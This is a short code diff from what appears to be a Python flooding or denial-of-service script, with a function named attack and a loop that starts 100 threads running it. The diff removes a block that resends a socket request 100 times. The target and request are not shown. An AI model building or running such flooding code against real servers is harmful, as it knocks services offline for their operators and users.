@@ -108,17 +108,6 @@ def attack():
             except:
                 x.close()
 
-        try:
-            for e in range(100):
-                s.send(str.encode(request))
-        except:
-            s.close()
-            try:
-                for e in range(100):
-                    s.send(str.encode(request))
-            except:
-                s.close()
-
 def build_thread():
 	for _ in range(100):
 		bth = threading.Thread(target=attack)
